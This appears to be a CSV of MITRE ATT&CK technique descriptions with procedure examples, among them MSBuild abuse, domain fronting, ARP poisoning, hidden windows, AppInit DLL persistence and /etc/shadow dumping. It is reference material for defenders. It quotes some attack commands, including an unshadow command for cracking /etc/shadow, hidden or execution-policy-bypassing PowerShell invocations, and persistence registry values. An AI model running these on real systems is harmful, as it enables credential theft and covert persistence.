T1127.001,MSBuild,"Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.  Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file. MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.","['A version of [PlugX] loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application control techniques.', '[Empire] can use built-in modules to abuse trusted utilities like MSBuild.exe. ', 'During [Frankenstein] the threat actors used MSbuild to execute an actor-created file.', '[Frankenstein] has used MSbuild to execute an actor-created file.']",False
T1578.005,Modify Cloud Compute Configurations,"Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim’s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.  For example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional [Resource Hijacking] without raising suspicion by using up a victim’s entire quota. Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.  Adversaries may also modify settings that affect where cloud resources can be deployed, such as enabling [Unused/Unsupported Cloud Regions] In Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources, or engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim’s compute resources without generating logs on the victim tenant. ",[],False
T1090.004,Domain Fronting,"Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.  Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, ""domainless"" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).  For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.","['[Cobalt Strike] has the ability to accept a value for HTTP Host Header to enable domain fronting.', '[APT29] has used the meek domain fronting plugin for [Tor] to hide the destination of C2 traffic.', '[meek] uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended destination.', '[Mythic] supports domain fronting via custom request headers.\t', '[SMOKEDHAM] has used a fronted domain to obfuscate its hard-coded C2 server domain.']",
T1557.002,ARP Cache Poisoning,"Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing] or [Transmitted Data Manipulation]  The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address. Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.  An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.  The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.  Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol. ","['[Cleaver] has used custom tools to facilitate ARP cache poisoning.', '[LuminousMoth] has used ARP spoofing to redirect a compromised machine to an actor-controlled website.']",False
T1562.008,Disable or Modify Cloud Logs,"An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.  For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity. They may alternatively tamper with logging functionality – for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files. In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license.","['[Pacu] can disable or otherwise restrict various AWS logging services, such as AWS CloudTrail and VPC flow logs.', '[APT29] has disabled Purview Audit on targeted accounts prior to stealing emails from  Microsoft 365 tenants.']",False
T1518.001,Security Software Discovery,"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from [Security Software Discovery] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  Example commands that can be used to obtain security software information are [netsh] <code>reg query</code> with [Reg] <code>dir</code> with [cmd] and [Tasklist] but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.  Adversaries may also utilize the [Cloud API] to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.","['[Darkhotel] has searched for anti-malware strings and anti-virus processes running on the system. ', '[Clop] can search for processes with antivirus and antimalware product names.', '[ABK] has the ability to identify the installed anti-virus product on the compromised host.', 'During [Operation Wocao] threat actors used scripts to detect security software.', '[Sidewinder] has used the Windows service <code>winmgmts:\\\\.\\root\\SecurityCenter2</code> to check installed antivirus products.', '[Metamorfo] collects a list of installed antivirus software from the victim’s system. ', '[QakBot] can identify the installed antivirus product on a targeted system.', '[Micropsia] searches for anti-virus software and firewall products installed on the victim’s machine using WMI.', '[SideCopy] uses a loader DLL file to collect AV product names from an infected host.', '[Crimson] contains a command to collect information about anti-virus software on the victim.', '[Zeus Panda] checks to see if anti-virus, anti-spyware, or firewall products are installed in the victim’s environment.', '[Windshift] has used malware to identify installed AV and commonly used forensic and malware analysis tools.', '[APT38] has identified security software, configurations, defensive tools, and sensors installed on a compromised system.', '[FIN8] has used Registry keys to detect and avoid executing in potential sandboxes.', '[Amadey] has checked for a variety of antivirus products.', '[TA2541] has used tools to search victim systems for security products such as antivirus and firewall software.', '[Comnie] attempts to detect several anti-virus products.', '[The White Company] has checked for specific antivirus products on the target’s computer, including Kaspersky, Quick Heal, AVG, BitDefender, Avira, Sophos, Avast!, and ESET.', '[Naikon] uses commands such as <code>netsh advfirewall firewall</code> to discover local firewall settings.', '[Bazar] can identify the installed antivirus engine.', ""[Cobalt Group] used a JavaScript backdoor that is capable of collecting a list of the security solutions installed on the victim's machine."", 'The main [CozyCar] dropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list, the dropper will exit.', '[ZxxZ] can search a compromised host to determine if it is running Windows Defender or Kasperky antivirus.', '[PUNCHBUGGY] can gather AVs registered in the system.\t', '[DarkTortilla] can check for the Kaspersky Anti-Virus suite.', '[POWERSTATS] has detected security tools.', '[FELIXROOT] checks for installed security software like antivirus and firewall.', '[TajMahal] has the ability to identify which anti-virus products, firewalls, and anti-spyware products are in use.', '[Mosquito] installer searches the Registry and system to see if specific antivirus tools are installed on the system.', '[VERMIN] uses WMI to check for anti-virus software installed on the system.', '[Valak] can determine if a compromised host has security products installed.', '[Skidmap] has the ability to check if <code>/usr/sbin/setenforce</code> exists. This file controls what mode SELinux is in. ', '[Flame] identifies security software such as antivirus through the Security module.', '[Astaroth] checks for the presence of Avast antivirus in the <code>C:\\Program\\Files\\</code> folder. ', '[Bumblebee] can identify specific analytical tools based on running processes.', '[Avenger] has the ability to identify installed anti-virus products on a compromised host.', ""[POWRUNER] may collect information on the victim's anti-virus software."", 'During [Frankenstein] the threat actors used WMI queries to determine if analysis tools were running on a compromised system.', '[BLUELIGHT] can collect a list of anti-virus products installed on a machine.', '[Woody RAT] can detect Avast Software, Doctor Web, Kaspersky, AVG, ESET, and Sophos antivirus programs.', '[NotPetya] determines if specific antivirus programs are running on an infected host machine.', '[YAHOYAH] checks for antimalware solution processes on the system.', ""[Wizard Spider] has used WMI to identify anti-virus products installed on a victim's machine."", '[Netwalker] can detect and terminate active security software-related processes on infected systems.\t', '[Patchwork] scanned the “Program Files” directories for a directory with the string “Total Security” (the installation path of the “360 Total Security” antivirus tool).', '[MarkiRAT] can check for running processes on the victim’s machine to look for Kaspersky and Bitdefender antivirus products.', '[MuddyWater] has used malware to check running processes against a hard-coded list of security tools often used by malware researchers.', '[Ferocious] has checked for AV software as part of its persistence process.', '[Grandoreiro] can list installed security products including the Trusteer and Diebold Warsaw GAS Tecnologia online banking protections.', '[T9000] performs checks for various antivirus and security products during installation.', '[CHOPSTICK] checks for antivirus and forensics software.', '[down_new] has the ability to detect anti-virus products and processes on a compromised host.', '[build_downer] has the ability to detect if the infected host is running an anti-virus process.', '[FlawedAmmyy] will attempt to detect anti-virus products during the initial infection.', '[WhisperGate] can recognize the presence of monitoring tools on a target system.', '[StrongPity] can identify if ESET or BitDefender antivirus are installed before dropping its payload.', '[StoneDrill] can check for antivirus and antimalware programs.\t', '[Tasklist] can be used to enumerate security software currently running on a system by process name of known products.', ""[Carberp] has queried the infected system's registry searching for specific registry keys associated with antivirus products."", '[Brute Ratel C4] can detect EDR userland hooks.', '[Aquatic Panda] has attempted to discover third party endpoint detection and response (EDR) tools on compromised systems.', '[xCaon] has checked for the existence of Kaspersky antivirus software on the system.', '[Felismus] checks for processes associated with anti-virus vendors.', '[Kimsuky] has checked for the presence of antivirus software with <code>powershell Get-CimInstance -Namespace root/securityCenter2 – classname antivirusproduct</code>.', '[Gelsemium] can check for the presence of specific security products.', '[TeamTNT] has searched for security products on infected machines.', '[jRAT] can list security software, such as by using WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.', '[Malteiro] collects the installed antivirus on the victim machine.', '[Kasidet] has the ability to identify any anti-virus installed on the infected system.', 'A module in [Prikormka] collects information from the victim about installed anti-virus software.', '[RogueRobin] enumerates running processes to search for Wireshark and Windows Sysinternals suite.', '[Waterbear] can find the presence of a specific security software.', '[Stuxnet] enumerates the currently running processes related to a variety of security products.', '[Mispadu] can list installed security products in the victim’s environment.', '[JPIN] checks for the presence of certain security-related processes and deletes its installer/uninstaller component if it identifies any of them.', '[DustySky] checks for the existence of anti-virus.', '[Turla] has obtained information on security software, including security logging information that may indicate whether their malware has been detected.', '[Wingbird] checks for the presence of Bitdefender security software.', '[ToddyCat] can determine is Kaspersky software is running on an endpoint by running `cmd /c wmic process where name=""avp.exe""`.', '[DarkGate] looks for various security products by process name using hard-coded values in the malware. [DarkGate] will not execute its keylogging thread if a process name associated with Trend Micro anti-virus is identified, or if runtime checks identify the presence of Kaspersky anti-virus. [DarkGate] will initiate a new thread if certain security products are identified on the victim, and recreate any malicious files associated with it if it determines they were removed by security software in a new system location.', '[Lizar] can search for processes associated with an anti-virus product from list. ', '[XCSSET] searches firewall configuration files located in <code>/Library/Preferences/</code> and uses <code>csrutil status</code> to determine if System Integrity Protection is enabled.', '[More_eggs] can obtain information on installed anti-malware programs.', '[Empire] can enumerate antivirus software on the target.', '[CookieMiner] has checked for the presence of ""Little Snitch"", macOS network monitoring and application firewall software, stopping and exiting if it is found.', '[LiteDuke] has the ability to check for the presence of Kaspersky security software.', '[BadPatch] uses WMI to enumerate installed security products in the victim’s environment.', '[Mafalda] can search for a variety of security software programs, EDR systems, and malware analysis tools.', '[Tropic Trooper] can search for anti-virus software running on the system.', '[EVILNUM] can search for anti-virus products on the system.', '[SUNBURST] checked for a variety of antivirus/endpoint detection agents prior to execution.', '[ThiefQuest] uses the <code>kill_unwanted</code> function to get a list of running processes, compares each process with an encrypted list of “unwanted” security related programs, and kills the processes for security related programs.', '[Epic] searches for anti-malware services running on the victim’s machine and terminates itself if it finds them.', '[RTM] can obtain information about security software on the victim.', '[DarkWatchman] can search for anti-virus products on the system.', '[FinFisher] probes the system to check for antimalware processes.', '[InvisiMole] can check for the presence of network sniffers, AV, and BitDefender firewall.', '[Gold Dragon] checks for anti-malware products and processes.', '[StreamEx] has the ability to scan for security tools such as firewalls and antivirus tools.', '[AuTo Stealer] has the ability to collect information about installed AV products from an infected host.', ""[Meteor] has the ability to search for Kaspersky Antivirus on a victim's machine."", '[Action RAT] can identify AV products on an infected host using the following command: `cmd.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List`.', '[EvilBunny] has been observed querying installed antivirus software.', '[SpicyOmelette] can check for the presence of 29 different antivirus tools.', '[Remsec] has a plugin detect security products via active drivers.', '[Pacu] can enumerate AWS security services, including WAF rules and GuardDuty detectors.', '[FunnyDream] can identify the processes for Bkav antivirus.', '[MoleNet] can use WMI commands to check the system for firewall and antivirus software.', '[netsh] can be used to discover system firewall settings.', ""[SILENTTRINITY] can determine if an anti-virus product is installed through the resolution of the service's virtual SID."", '[PipeMon] can check for the presence of ESET and Kaspersky security software.', '[LitePower] can identify installed AV software.', '[Rocke] used scripts which detected and uninstalled antivirus software.', '[Operation Wocao] has used scripts to detect security software.', '[Frankenstein] has used WMI queries to detect if virtualization environments or analysis tools were running on the system.']",False
T1564.003,Hidden Window,"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks.   Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.  On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.  Similarly, on Windows there are a variety of features in scripting languages, such as [PowerShell] Jscript, and [Visual Basic] to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.  In addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.","['[Astaroth] loads its module with the XSL script parameter <code>vShow</code> set to zero, which opens the application with a hidden window. ', '[QuietSieve] has the ability to execute payloads in a hidden window.', '[StrongPity] has the ability to hide the console window for its document search module from the user.', '[Kevin] can hide the current window from the targeted user via the `ShowWindow` API function.', '[APT3] has been known to use <code>-WindowStyle Hidden</code> to conceal [PowerShell] windows.', '[APT28] has used the WindowStyle parameter to conceal [PowerShell] windows. ', '[APT19] used <code>-W Hidden</code> to conceal [PowerShell] windows by setting the WindowStyle parameter to hidden. ', '[Koadic] has used the command <code>Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden</code> to hide its window.', '[HAMMERTOSS] has used <code>-WindowStyle hidden</code> to conceal [PowerShell] windows.', '[SILENTTRINITY] has the ability to set its window state to hidden.', '[QuasarRAT] can hide process windows and make web requests invisible to the compromised user. Requests marked as invisible have been sent with user-agent string `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A` though [QuasarRAT] can only be run on Windows systems.', '[KeyBoy] uses <code>-w Hidden</code> to conceal a [PowerShell] window that downloads a payload. ', '[SharpDisco] can hide windows using `ProcessWindowStyle.Hidden`.', '[MCMD] can modify processes to prevent them from being visible on the desktop.', '[KOCTOPUS] has used <code>-WindowsStyle Hidden</code> to hide the command window.', '[BONDUPDATER] uses <code>-windowstyle hidden</code> to conceal a [PowerShell] window that downloads a payload.', '[Deep Panda] has used <code>-w hidden</code> to conceal [PowerShell] windows by setting the WindowStyle parameter to hidden. ', '[Agent Tesla] has used <code>ProcessWindowStyle.Hidden</code> to hide windows.', ' [AsyncRAT] can hide the execution of scheduled tasks using `ProcessWindowStyle.Hidden`.', '[Kivars] has the ability to conceal its activity through hiding active windows.', '[Gorgon Group] has used <code>-W Hidden</code> to conceal [PowerShell] windows by setting the WindowStyle parameter to hidden. ', '[CopyKittens] has used <code>-w hidden</code> and <code>-windowstyle hidden</code> to conceal [PowerShell] windows. ', '[QUIETCANARY] can execute processes in a hidden window.', '[Higaisa] used a payload that creates a hidden window.', '[Gamaredon Group] has used <code>hidcon</code> to run batch files in a hidden console window.', '[DarkHydrus] has used <code>-WindowStyle Hidden</code> to conceal [PowerShell] windows. ', 'WarzoneRAT has the ability of performing remote desktop access via a hVNC window for decreased visibility.', '[AvosLocker] has hidden its console window by using the `ShowWindow` API function.', '[ToddyCat] has hidden malicious scripts using `powershell.exe -windowstyle hidden`. ', '[Meteor] can hide its console window upon execution to decrease its visibility to a victim.', '[Nomadic Octopus] executed PowerShell in a hidden window. ', '[InvisiMole] has executed legitimate tools in hidden windows.', '[Kimsuky] has used an information gathering module that will hide an AV software window from the victim.', '[APT32] has used the WindowStyle parameter to conceal [PowerShell] windows.  ', '[PowerShower] has added a registry key so future powershell.exe instances are spawned with coordinates for a window position off-screen by default.', '[Magic Hound] malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window.', 'TrickBot has used a hidden VNC (hVNC) window to monitor the victim and collect information stealthily.', '[Snip3] can execute PowerShell scripts in a hidden window.', '[WindTail] can instruct the OS to execute an application without a dock icon or menu.', '[Metamorfo] has hidden its GUI using the ShowWindow() WINAPI call. ', '[Cuba] has executed hidden PowerShell windows. ', '[HotCroissant] has the ability to hide the window for operations performed on a given file.', '[Ursnif] droppers have used COM properties to execute malware in hidden windows.']",False
T1059.006,Python,"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.  Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.","['[IronNetInjector] can use IronPython scripts to load payloads with the help of a .NET injector.', '[DropBook] is a Python-based backdoor compiled with PyInstaller.', '[PUNCHBUGGY] has used python scripts.', '[APT37] has used Python scripts to execute payloads.', '[BRONZE BUTLER] has made use of Python-based remote access tools.', '[Donut] can generate shellcode outputs that execute via Python.\t', '[SpeakUp] uses Python scripts.', '[Tonto Team] has used Python-based tools for execution. ', '[PyDCrypt] along with its functions, is written in Python.', '[ZIRCONIUM] has used Python-based implants to interact with compromised hosts.', '[Pysa] has used Python scripts to deploy ransomware.', '[KeyBoy] uses Python scripts for installing files and performing execution.', '[Rocke] has used Python-based malware to install and spread their coinminer.', '[Machete] used multiple compiled Python scripts on the victim’s system. [Machete] main backdoor [Machete] is also written in Python.', '[Remcos] uses Python scripts.', '[Bundlore] has used Python scripts to execute payloads.', '[Earth Lusca] used Python scripts for port scanning or building reverse shells.', '[Small Sieve] can use Python scripts to execute commands.', '[SILENTTRINITY] is written in Python and can use multiple Python scripts for execution on targeted systems.', '[Chaes] has used Python scripts for execution and the installation of additional files. ', '[MuddyWater] has developed tools in Python including [Out1]', ""During [Operation Wocao] threat actors' backdoors were written in Python and compiled with py2exe."", '[MechaFlounder] uses a python-based payload.', '[Cinnamon Tempest] has used a customized version of the [Impacket] wmiexec.py module to create renamed output files.', 'During [Cutting Edge] threat actors used a Python reverse shell and the PySoxy SOCKS5 proxy tool.', '[Turian] has the ability to use Python to spawn a Unix shell.', '[Turla] has used IronPython scripts as part of the [IronNetInjector] toolchain to drop payloads.', '[APT29] has developed malware variants written in Python.', '[CoinTicker] executes a Python script to download its second stage.', '[Pupy] can use an add on feature when creating payloads that allows you to create custom Python scripts (“scriptlets”) to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc.', '[Ebury] has used Python to implement its DGA.\t', '[APT39] has used a command line utility and a network scanner written in python.', '[Bandook] can support commands to execute Python-based payloads.', '[Machete] is written in Python and is used in conjunction with additional Python scripts.', '[FRAMESTING] is a Python web shell that can embed in the Ivanti Connect Secure CAV Python package.', '[PoetRAT] was executed with a Python script and worked in conjunction with additional Python-based post-exploitation tools.', '[Cobalt Strike] can use Python to perform execution.', '[CookieMiner] has used python scripts on the user’s system, as well as the Python variant of the [Empire] agent, EmPyre.', '[Keydnap] uses Python for scripting to execute additional commands.', '[Dragonfly] has used various types of scripting to perform operations, including Python scripts. The group was observed installing Python 2.7 on a victim.', '[Kimsuky] has used a macOS Python implant to gather data as well as MailFetcher.py code to automatically collect email data.', '[TRITON] was run as trilog.exe, a Py2EXE compiled python script that accepts a single IP address as a flag.', '[Operation Wocao] backdoors have been written in Python and compiled with py2exe.', '[Dragonfly 2.0] used various types of scripting to perform operations, including Python scripts. The group was observed installing Python 2.7 on a victim.', '[Cobalt Strike] can use Python to perform execution.']",False
T1591.004,Identify Roles,"Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.  Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information] Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media] or [Search Victim-Owned Websites] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Websites/Domains] establishing operational resources (ex: [Establish Accounts] or [Compromise Accounts] and/or initial access (ex: [Phishing]","['[LAPSUS$] has gathered detailed knowledge of team structures within a target organization.', 'During [Operation Dream Job] [Lazarus Group] targeted specific individuals within an organization with tailored job vacancy announcements.', '[HEXANE] has identified executives, HR, and IT staff at victim organizations for further targeting.', '[Lazarus Group] has targeted specific individuals within an organization with tailored job vacancy announcements.']",
T1546.010,AppInit DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> or <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library.   Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.  Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity.   The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. ","['[APT39] has used malware to set <code>LoadAppInit_DLLs</code> in the Registry key <code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> in order to establish persistence.', 'If a victim meets certain criteria, [T9000] uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys: <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs – %APPDATA%\\Intel\\ResN32.dll</code> and <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs – 0x1</code>.', 'Some variants of [Cherry Picker] use AppInit_DLLs to achieve persistence by creating the following Registry key: <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows ""AppInit_DLLs""=""pserver32.dll""</code>', '[Ramsay] can insert itself into the address space of other applications using the AppInit DLL Registry key.\t']",False
T1546.002,Screensaver,"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. The Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>, and <code>C:\Windows\sysWOW64\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.  The following screensaver settings are stored in the Registry (<code>HKCU\Control Panel\Desktop\</code>) and could be manipulated to achieve persistence:  * <code>SCRNSAVE.exe</code> - set to malicious PE path * <code>ScreenSaveActive</code> - set to '1' to enable the screensaver * <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock * <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed  Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.",['[Gazer] can establish persistence through the system screensaver by configuring it to execute the malware.'],False
T1556.009,Conditional Access Policies,"Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.  For example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication. In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested. These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required.   By modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication] requirements, or allowing additional [Unused/Unsupported Cloud Regions] adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",['[Scattered Spider] has added additional trusted locations to Azure AD conditional access policies. '],False
T1578.002,Create Cloud Instance,"An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot] of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System] or for [Remote Data Staging]  Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.","[""During [C0027] [Scattered Spider] used access to the victim's Azure tenant to create Azure VMs."", ""[LAPSUS$] has created new virtual machines within the target's cloud environment after leveraging credential access to cloud assets. "", ""During [C0027] [Scattered Spider] used access to the victim's Azure tenant to create Azure VMs.  [Scattered Spider] has also created Amazon EC2 instances within the victim's environment.""]",
T1555.006,Cloud Secrets Management Stores,"Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.    Secrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.    If an adversary is able to gain sufficient privileges in a cloud environment – for example, by obtaining the credentials of high-privileged [Cloud Accounts] or compromising a service that has permission to retrieve secrets – they may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.  **Note:** this technique is distinct from [Cloud Instance Metadata API] in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.",['[Pacu] can retrieve secrets from the AWS Secrets Manager via the enum_secrets module.'],False
T1213.003,Code Repositories,"Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits] while credentials may provide access to additional resources using [Valid Accounts]  **Note:** This is distinct from [Code Repositories] which focuses on conducting [Reconnaissance] via public code repositories.","[""[LAPSUS$] has searched a victim's network for code repositories like GitLab and GitHub to discover further high-privilege account credentials."", '[Scattered Spider] enumerates data stored within victim code repositories, such as internal GitHub repositories.', 'During the [SolarWinds Compromise] [APT29] downloaded source code from code repositories.', '[APT41] cloned victim user Git repositories during intrusions.', '[APT29] has downloaded source code from code repositories.']",False
T1565.002,Transmitted Data Manipulation,"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.  Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","['[Melcoz] can monitor the clipboard for cryptocurrency addresses and change the intended address to one controlled by the adversary.', '[APT38] has used DYEPACK to manipulate SWIFT messages en route to a printer.', '[LightNeuron] is capable of modifying email content, headers, and attachments during transit.', ""[Metamorfo] has a function that can watch the contents of the system clipboard for valid bitcoin addresses, which it then overwrites with the attacker's address. ""]",False
T1003.008,/etc/passwd and /etc/shadow,"Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.  The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper: <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code> ",['[LaZagne] can obtain credential information from /etc/shadow using the shadow.py module.'],
